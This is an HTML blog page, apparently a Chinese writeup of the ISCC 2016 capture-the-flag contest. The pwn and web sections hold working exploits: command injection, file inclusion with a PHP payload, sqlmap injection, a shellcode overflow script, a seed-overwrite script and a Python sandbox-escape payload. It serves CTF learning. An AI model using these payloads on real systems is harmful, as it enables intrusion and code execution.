@@ -1,0 +1,222 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <title>ISCC 2016 writeup (部分题解) | Lazymind</title>
+  
+    
+      <link rel="stylesheet" href="/css/normalize.css">
+    
+      <link rel="stylesheet" href="/css/base.css">
+    
+      <link rel="stylesheet" href="/css/aside.css">
+    
+      <link rel="stylesheet" href="/css/blockquote.css">
+    
+      <link rel="stylesheet" href="/css/permalink.css">
+    
+      <link rel="stylesheet" href="/css/postscript.css">
+    
+      <link rel="stylesheet" href="/css/highlight/index.css">
+    
+  
+</head>
+<body>
+  <div class="page">
+    <nav id="menu-outer">
+      <div id="menu-inner">
+        
+          <a href="/">Home</a>
+        
+          <a href="/leetcode/">Leetcode</a>
+        
+          <a href="/about/">About</a>
+        
+      </div>
+    </nav>
+
+    <div id="content-outer">
+      <div id="content-inner">
+        <article id="post" itemscope itemtype="http://schema.org/Article">
+  <img itemprop="image" hidden src="/favicon.ico">
+  <link itemprop="mainEntityOfPage" href="https://lazymind.me/2016/05/iscc-2016-ctf-writeup/">
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="ISCC 2016 writeup (部分题解)">
+  </span>
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="Conan">
+    <meta itemprop="description" content="The quieter you are the more you are able to hear.">
+    <meta itemprop="image" content="/favicon.ico">
+  </span>
+  <header>
+  <h1 itemprop="headline name">ISCC 2016 writeup (部分题解)</h1>
+  <p>Written on <time itemprop="dateCreated datePublished dateModified" datetime="2016-05-25T15:02:13.000Z">2016-05-25</time></p>
+  </header>
+  <div class="page-toc">
+    <details class="toc">
+      <summary class="toc-accordion">
+        Table of Contents
+      </summary>
+        
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Basic50-Find-to-me"><span class="toc-number">1.</span> <span class="toc-text">Basic50 Find to me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Basic50-好长的字符串"><span class="toc-number">2.</span> <span class="toc-text">Basic50 好长的字符串</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Basic50-明察秋毫"><span class="toc-number">3.</span> <span class="toc-text">Basic50 明察秋毫</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Basic100-心灵鸡汤"><span class="toc-number">4.</span> <span class="toc-text">Basic100 心灵鸡汤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Basic100-小伟的密码"><span class="toc-number">5.</span> <span class="toc-text">Basic100 小伟的密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Baisc200-JJ"><span class="toc-number">6.</span> <span class="toc-text">Baisc200 JJ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc150-一切都在"><span class="toc-number">7.</span> <span class="toc-text">Misc150 一切都在</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc200-Music-Never-Sleep"><span class="toc-number">8.</span> <span class="toc-text">Misc200 Music Never Sleep</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc300-毕业论文"><span class="toc-number">9.</span> <span class="toc-text">Misc300 毕业论文</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web150-flag-in-flag"><span class="toc-number">10.</span> <span class="toc-text">web150 flag in flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web300-PING出事了吧"><span class="toc-number">11.</span> <span class="toc-text">web300 PING出事了吧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web350-simple-injection"><span class="toc-number">12.</span> <span class="toc-text">Web350 simple injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web350-double-kill"><span class="toc-number">13.</span> <span class="toc-text">Web350 double kill</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse150-Help-me"><span class="toc-number">14.</span> <span class="toc-text">Reverse150 Help me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse150-仪式"><span class="toc-number">15.</span> <span class="toc-text">Reverse150 仪式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwn100"><span class="toc-number">16.</span> <span class="toc-text">Pwn100</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwn250-guess"><span class="toc-number">17.</span> <span class="toc-text">Pwn250 guess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwn300-pycalc"><span class="toc-number">18.</span> <span class="toc-text">Pwn300 pycalc</span></a></li></ol>
+        
+      </details>
+  </div>
+  <div itemprop="articleBody">
+    <h3 id="Basic50-Find-to-me"><a href="#Basic50-Find-to-me" class="headerlink" title="Basic50 Find to me"></a>Basic50 Find to me</h3><blockquote>
+<p>已知仿射加密变换为 c = (11m+8) mod 26，试对密文 sjoyuxzr 解密</p>
+</blockquote>
+<p>看这篇文章就能弄懂 <a href="http://bbs.pediy.com/showthread.php?t=89299" target="_blank" rel="noopener">http://bbs.pediy.com/showthread.php?t=89299</a></p>
+<p><code>flag: itksuzlp</code></p>
+<h3 id="Basic50-好长的字符串"><a href="#Basic50-好长的字符串" class="headerlink" title="Basic50 好长的字符串"></a>Basic50 好长的字符串</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Vm0wd2QyVkhVWGhVYmxKV1YwZDRXRmxVUm5kVlJscHpXa2M1</span><br><span class="line">VjFKdGVGWlZNbmhQWVd4YWMxZHViRmROYWxaeVdWZDRZV01</span><br><span class="line">4WkhGU2JIQk9VbTVDZVZkV1pEUlRNazE0Vkc1T2FWSnVRazlWY</span><br><span class="line">WtwdlZWWmtWMWt6YUZSTlZUVkpWbTEwYzJGV1NuVlJiR2hYWW</span><br><span class="line">xSV1JGcFdXbXRXTVZwMFpFWlNUbFp1UWpaV2Fra3hVakZaZVZO</span><br><span class="line">cmJGSmlWR3hXVm01d1IyUldjRmhsUjBacVZtczFNVmt3WkRSVk1ER</span><br><span class="line">kZWbXBXVjFKc2NGaFdha3BIVTBaYWRWSnNTbGRTTTAwMQ==</span><br></pre></td></tr></table></figure>
+
+<p>多次解 base64 即可</p>
+<p><code>flag: goodluckiscc</code></p>
+<a id="more"></a>
+
+
+<h3 id="Basic50-明察秋毫"><a href="#Basic50-明察秋毫" class="headerlink" title="Basic50 明察秋毫"></a>Basic50 明察秋毫</h3><p>查看网页源码，得到 <code>maybe not flag : Jr1p0zr2VfPp</code> 看似 <code>rot13</code>，解得</p>
+<p><code>flag: We1c0me2IsCc</code></p>
+<h3 id="Basic100-心灵鸡汤"><a href="#Basic100-心灵鸡汤" class="headerlink" title="Basic100 心灵鸡汤"></a>Basic100 心灵鸡汤</h3><p>比较简单的逆向，可以发现加上参数 <code>ISCC</code>会有不同的结果</p>
+<p><img src="/media/14630355493646/14630408344746.jpg" alt></p>
+<p>想了很久不知道是什么加密方式。。。后面别人提醒才知道是培根加密,有两个加密表，有个解出来是对的</p>
+<p><code>flag: HACKERISCC</code></p>
+<h3 id="Basic100-小伟的密码"><a href="#Basic100-小伟的密码" class="headerlink" title="Basic100 小伟的密码"></a>Basic100 小伟的密码</h3><p>这道题有点运气。。。我做题时没windows系统，都是在mac下面看的题目，结果能直接看见隐藏的文件。。。</p>
+<p><img src="/media/14630355493646/14630411373281.jpg" alt></p>
+<p>后面我发现在windows上这些文件是隐藏的</p>
+<p><code>flag: ImnrelnaSicoftethgoicynyrouTo</code></p>
+<h3 id="Baisc200-JJ"><a href="#Baisc200-JJ" class="headerlink" title="Baisc200 JJ"></a>Baisc200 JJ</h3><p><img src="/media/14630355493646/14630414489708.jpg" alt></p>
+<p>js fuck.解码得到一个百度云链接，下载下来</p>
+<p><img src="/media/14630355493646/14630414948583.jpg" alt></p>
+<p>第一次看到这个，根据题目描述的 JJ ，google 发现是 jjencode， github上找了个 jjdecode 脚本，解出来，注意要把匿名函数最后返回的 <code>return p</code> 替换成 <code>return d</code></p>
+<p><code>flag: 34be5bcb6c6f0bcfc628d9e390d13ba6</code></p>
+<h3 id="Misc150-一切都在"><a href="#Misc150-一切都在" class="headerlink" title="Misc150 一切都在"></a>Misc150 一切都在</h3><p>分析网络请求，发现有个图片的请求，提取数据得到一个图片</p>
+<p><img src="/media/14630355493646/14630416667438.jpg" alt></p>
+<h3 id="Misc200-Music-Never-Sleep"><a href="#Misc200-Music-Never-Sleep" class="headerlink" title="Misc200 Music Never Sleep"></a>Misc200 Music Never Sleep</h3><p>mp3文件写隐，一直没头绪，<code>strings + grep</code> 一阵乱搜也没什么，用Audacity看了也没看出什么来。后面才知道是 mp3stego<a href="http://www.petitcolas.net/steganography/mp3stego/" target="_blank" rel="noopener">http://www.petitcolas.net/steganography/mp3stego/</a>, 根据页面example发现需要密码，重新搜关键词 <code>iscc</code></p>
+<p><img src="/media/14630355493646/14635423380419.jpg" alt></p>
+<p>解密后得到文件 <code>iscc2016.mp3.txt</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag is SkYzWEk0M1JOWlNHWTJTRktKUkdJTVpXRzVSV0U2REdHTVpHT1pZPQ== ???</span><br></pre></td></tr></table></figure>
+
+<p>一次<code>base64</code> 一次<code>base32</code></p>
+<p><code>flag: IwtsqndljERbd367cbxf32gg</code></p>
+<h3 id="Misc300-毕业论文"><a href="#Misc300-毕业论文" class="headerlink" title="Misc300 毕业论文"></a>Misc300 毕业论文</h3><p>这道题真的是考脑洞。。。刚开始一直以为会在图片上做文章，后面发现完全不是这样，这个今年的zctf有相似的题，见<a href="http://www.freebuf.com/articles/web/94444.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/94444.html</a></p>
+<p>将doc另存为xml</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  xml.dom.minidom</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'gbk'</span>)</span><br><span class="line">dom = xml.dom.minidom.parse(<span class="string">'them.xml'</span>)</span><br><span class="line">root = dom.documentElement</span><br><span class="line">str1 = <span class="string">''</span></span><br><span class="line">bb = root.getElementsByTagName(<span class="string">'w:spacing'</span>)</span><br><span class="line">b= bb[<span class="number">10</span>]</span><br><span class="line">b1 = b.getAttribute(<span class="string">"w:val"</span>)</span><br><span class="line"><span class="keyword">print</span> b1</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">10</span>,len(bb)):</span><br><span class="line">    <span class="keyword">if</span> bb[k].getAttribute(<span class="string">"w:val"</span>) == <span class="string">"2"</span> :</span><br><span class="line">        str1 += <span class="string">'1'</span> * len(str(bb[k].parentNode.parentNode.getElementsByTagName(<span class="string">'w:t'</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].data).decode(<span class="string">'gbk'</span>))</span><br><span class="line">    <span class="keyword">elif</span> bb[k].getAttribute(<span class="string">"w:val"</span>) == <span class="string">"-2"</span> :</span><br><span class="line">        str1 += <span class="string">'0'</span> * len(str(bb[k].parentNode.parentNode.getElementsByTagName(<span class="string">'w:t'</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].data).decode(<span class="string">'gbk'</span>))</span><br><span class="line"><span class="keyword">print</span> str1</span><br><span class="line"><span class="keyword">print</span> len(str1)</span><br><span class="line"><span class="comment">#print len(bb)</span></span><br></pre></td></tr></table></figure>
+
+<p>跑出来发现01总共135位，不是偶数位。先转ASCII，发现有<code>}</code>符号，手工在最前面补了个0得到<code>lag{0h-Mj_The8i8}</code>，看来脚本少统计了个，不过不影响</p>
+<p>故：<code>flag{0h-Mj_The8i8}</code></p>
+<h3 id="web150-flag-in-flag"><a href="#web150-flag-in-flag" class="headerlink" title="web150 flag in flag"></a>web150 flag in flag</h3><p><img src="/media/14630355493646/14630388492254.jpg" alt></p>
+<p>查看题目给的源码，发现存在注入，上 <code>sqlmap</code>，得到flag</p>
+<p><img src="/media/14630355493646/14630393075941.jpg" alt></p>
+<h3 id="web300-PING出事了吧"><a href="#web300-PING出事了吧" class="headerlink" title="web300 PING出事了吧"></a>web300 PING出事了吧</h3><p>访问 <code>http://101.200.145.44/web2/</code> 一看感觉像是shell 命令拼接</p>
+<p><img src="/media/14630355493646/14630380964753.jpg" alt></p>
+<p>试了 “$”, “|” 等一些字符，全部提示输入格式错误，实在没思路了，手贱在网址后面加<code>.bak</code> ，<code>.txt</code> 意外发现存在 <code>http://101.200.145.44/web2/index.php.txt</code>，应该是<code>index.php</code> 的源码，看了下正则，构造 <code>127.0.0.1&amp;&amp;dir</code> 得到文件列表</p>
+<p><img src="/media/14630355493646/14630383833367.jpg" alt></p>
+<p>继续使用<code>dir</code> 发现 <code>flag.php</code>文件。之后犯傻了，在源码里发现文件包含，想到用文件包含去读flag，<code>http://101.200.145.44/web2/index.php?file=1C9976C230DA289C1C359CD2A7C02D48/flag.php</code></p>
+<p> <img src="/media/14630355493646/14630384726958.jpg" alt></p>
+<p>结果得到flag了。</p>
+<p><img src="/media/14630355493646/14630385386141.jpg" alt></p>
+<p>但是提交就是不对，开始怀疑它是不是又加密了。。。后面直接访问 <code>http://101.200.145.44/web2/1C9976C230DA289C1C359CD2A7C02D48/flag.php</code> 得到了另一个完全不一样的flag…..</p>
+<p><img src="/media/14630355493646/14630386203749.jpg" alt></p>
+<p>这个才是最终的flag。这个源码给的提示，我服！</p>
+<h3 id="Web350-simple-injection"><a href="#Web350-simple-injection" class="headerlink" title="Web350 simple injection"></a>Web350 simple injection</h3><p>直接是一个登录页面，看题目，像是sql注入，试了一下发现<code>username</code>存在注入，但是按照平常的用sqlmap一直跑的话会一直500错误，感觉需要处理一下payload，后面才知道应该使用sqlmap的tamper。先用<code>burpsuite</code>导出post提交的内容，然后结合sqlmap:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r iscc.txt --tamper space2comment</span><br></pre></td></tr></table></figure>
+
+<p><img src="/media/14630355493646/14635946016495.jpg" alt></p>
+<p>得到帐号信息，md5解密为<code>yinquesiting</code>,登录后等到flag:</p>
+<p><code>flag{51f52db9-5304-4dcf-acb1-6b0ec2e167f2}</code></p>
+<h3 id="Web350-double-kill"><a href="#Web350-double-kill" class="headerlink" title="Web350 double kill"></a>Web350 double kill</h3><p>看见url里面出现了<code>page=submit</code>和<code>page=view</code>立马想到了文件包含。自己还能上传图片，应该去包含自己的图片干一些事情。图片是以上传的时间戳加后缀保存的，包含的时间直接加路径不行，需要加上<code>%00</code>截断。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.200.145.44/web5/index.php?page=uploads/1463714491.jpg%00</span><br></pre></td></tr></table></figure>
+
+<p>先直接加<code>&lt;?php phpinfo(); ?&gt;</code>，结果回显是<code>you can do this</code>, 可能加上了过滤，换另一种写法 <code>&lt;script language=&quot;php&quot;&gt; phpinfo(); &lt;/script&gt;</code>，直接就回显flag了。。。好吧。。。</p>
+<p><img src="/media/14630355493646/14639870445888.jpg" alt></p>
+<p>其实还有更鸡贼的做法，服务器上传了图片后，它是没删除图片的，你可以根据前面解题人的时间，往前推一个小时，遍历这个小时内的所有图片，然后再包含看看，就能得到flag。不知道<code>1463714491.jpg</code>是哪位大神上传的。。。我直接找了这个图片通过了0_o</p>
+<h3 id="Reverse150-Help-me"><a href="#Reverse150-Help-me" class="headerlink" title="Reverse150 Help me"></a>Reverse150 Help me</h3><p>下载附近，扔进IDA，简单看下，就是输入一个数字看是不是符合要求，如果正确则会给出：<code>Thanks for your key, now here is what you want : {flag}</code>， 逆向算法自己不会。。。只有简单爆破了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> PIPE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">999999999</span>, <span class="number">1</span>, <span class="number">-1</span>):</span><br><span class="line">    p = Popen([<span class="string">'./difficult'</span>], stdin=PIPE, stdout=PIPE)</span><br><span class="line">    output, err = p.communicate(input=str(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Thanks'</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="keyword">print</span> output</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>猜测是应该是比较大的数，所以倒着跑数字</p>
+<p><code>Thanks for your key, now here is what you want : ISCC{n0t_5o-diffic1u7}</code></p>
+<h3 id="Reverse150-仪式"><a href="#Reverse150-仪式" class="headerlink" title="Reverse150 仪式"></a>Reverse150 仪式</h3><p><img src="/media/14630355493646/14640888832453.jpg" alt></p>
+<p><img src="/media/14630355493646/14640890393410.jpg" alt></p>
+<p>IDA分析，定位到函数<code>sub_402860</code>，函数<code>sub_41CBE4</code>是获取输入框字符的，分别将<code>username</code>和<code>password</code>赋值给<code>String</code>和 数组<code>v8</code>， 直接能看出<code>username</code>为<code>WelcomeToISCC</code>，密码需要转换下，得到<code>IsInteresting</code>。其它是一些验证的，没仔细看了。结果在输入后点<code>GetFlag</code>没反应，题目描述说的是需要一些仪式，猜测是需要点击那四个尖角符号，瞎点一通就出flag了</p>
+<p><img src="/media/14630355493646/14640946135162.jpg" alt></p>
+<p><code>flag: {IItrsiWell}</code></p>
+<h3 id="Pwn100"><a href="#Pwn100" class="headerlink" title="Pwn100"></a>Pwn100</h3><p>第一次做逆向题，很多都是在<code>Shrek_wzw</code>指点下完成的。</p>
+<p>先静态分析：</p>
+<p><img src="/media/14630355493646/14636452830598.jpg" alt></p>
+<p>可以看出这个pwn本身很简单，<code>dword_804A160</code> 是一个函数指针，在得到用户输入后，执行该函数。</p>
+<p><img src="/media/14630355493646/14636455848196.jpg" alt></p>
+<p>输入的字符串是存到<code>0x804A060</code>地址开始的，而在 <code>call eax</code> 的时候是将 <code>0x804A160</code> 开始的4个字节放到 <code>eax</code> 里面，再调用函数的。所以最后的<code>payload</code>应该是 <code>&#39;A&#39;*0x100 + shellcode起始地址 + shellcode</code></p>
+<p>这个需要注意的是<code>scanf</code>会对某些字符进行截断操作，所以shellcode要么encode一下，要么把产生截断字符的语句换成相等的其他语句。encode可以使用 Alpha3 进行编码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'101.200.187.112'</span>, <span class="number">9004</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'hffffk4diFkTpj02Tpk0T0AuEE0t3i4C3B3I7o2r1k0m7L2Z1o177M2p0X154y4N3j8L02'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">r.sendline(<span class="string">'A'</span> * <span class="number">0x100</span> + p32(<span class="number">0x804a164</span>) + shellcode)</span><br><span class="line">r.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.interactive()</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Pwn250-guess"><a href="#Pwn250-guess" class="headerlink" title="Pwn250 guess"></a>Pwn250 guess</h3><p>有个相似的题目 <a href="https://www.securifera.com/blog/2015/09/09/mmactf-2015-rock-paper-scissors-rps/" target="_blank" rel="noopener">https://www.securifera.com/blog/2015/09/09/mmactf-2015-rock-paper-scissors-rps/</a></p>
+<p><img src="/media/14630355493646/14637168641692.jpg" alt></p>
+<p>分析代码，程序先用<code>time(0)</code>作为随机种子，然后需要猜测每次生成的随机数，如果连续猜对100次，就能得到flag。</p>
+<p><img src="/media/14630355493646/14637166964214.jpg" alt></p>
+<p>仔细看代码，随机种子在初始化之后，并不是马上就执行<code>srand(seed)</code>的，而是等待用户输入用户名之后才执行的，而对用户名却没有长度限制，那么我们可以输入一定长度的<code>name</code>来覆盖程序生成的<code>seed</code>。因为<code>rand()</code>本身是一个伪随机函数，当每次的<code>seed</code>的相同时，生成的随机数也是一样的。</p>
+<p>上脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = CDLL(<span class="string">"libc.so.6"</span>)</span><br><span class="line">libc.srand(<span class="number">0x01010101</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_next_answer</span><span class="params">()</span>:</span></span><br><span class="line">    seed = libc.rand()</span><br><span class="line">    libc.srand(seed)</span><br><span class="line">    n = libc.rand() % <span class="number">0x1869F</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'101.200.187.112'</span>, <span class="number">9001</span>)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">name = <span class="string">'A'</span> * <span class="number">0x28</span> + <span class="string">'\x01'</span> * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">r.sendline(name)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    n = get_next_answer()</span><br><span class="line">    <span class="keyword">print</span> r.recv()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Sending: '</span> + str(n) + <span class="string">'\n'</span></span><br><span class="line">    r.sendline(str(n))</span><br><span class="line">    <span class="keyword">print</span> r.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
+
+<p><code>flag: {1a28e5ea63f246745db921f924f3cf4b}</code></p>
+<h3 id="Pwn300-pycalc"><a href="#Pwn300-pycalc" class="headerlink" title="Pwn300 pycalc"></a>Pwn300 pycalc</h3><p>一道python  sandbox 绕过的题目，相似ctf题都是用的<code>warnings.catch_warnings.__enter__.__func__.__globals__[&#39;linecache&#39;].checkcache.__globals__[&#39;os&#39;]</code>这个来绕过，这个题在这里有限制。直接题目给的<code>__builtins__</code>其实是有限制的，需要从其它模块中得到<code>__builtins__</code></p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### 59 是 warnings.catch_warnings 在list里的索引位置</span></span><br><span class="line">getattr(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">'o'</span>+<span class="string">'s'</span>), <span class="string">'s'</span>+<span class="string">'yst'</span>+<span class="string">'em'</span>)(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/media/14630355493646/14638106824527.jpg" alt></p>
+<p><img src="/media/14630355493646/14638107053955.jpg" alt></p>
+<p><code>flag{a23c60c8f9199ead4962705c7191fe3c}</code></p>
+<p>可以再研究下它的原始脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"============================================="</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"   Simple calculator implemented by python   "</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"============================================="</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getexp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> raw_input(<span class="string">"&gt;&gt;&gt; "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hook_import_</span><span class="params">(name, *args, **kwargs)</span>:</span></span><br><span class="line">    module_blacklist = [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'time'</span>, <span class="string">'bdb'</span>, <span class="string">'bsddb'</span>, <span class="string">'cgi'</span>,</span><br><span class="line">            <span class="string">'CGIHTTPServer'</span>, <span class="string">'cgitb'</span>, <span class="string">'compileall'</span>, <span class="string">'ctypes'</span>, <span class="string">'dircache'</span>,</span><br><span class="line">            <span class="string">'doctest'</span>, <span class="string">'dumbdbm'</span>, <span class="string">'filecmp'</span>, <span class="string">'fileinput'</span>, <span class="string">'ftplib'</span>, <span class="string">'gzip'</span>,</span><br><span class="line">            <span class="string">'getopt'</span>, <span class="string">'getpass'</span>, <span class="string">'gettext'</span>, <span class="string">'httplib'</span>, <span class="string">'importlib'</span>, <span class="string">'imputil'</span>,</span><br><span class="line">            <span class="string">'linecache'</span>, <span class="string">'macpath'</span>, <span class="string">'mailbox'</span>, <span class="string">'mailcap'</span>, <span class="string">'mhlib'</span>, <span class="string">'mimetools'</span>,</span><br><span class="line">            <span class="string">'mimetypes'</span>, <span class="string">'modulefinder'</span>, <span class="string">'multiprocessing'</span>, <span class="string">'netrc'</span>, <span 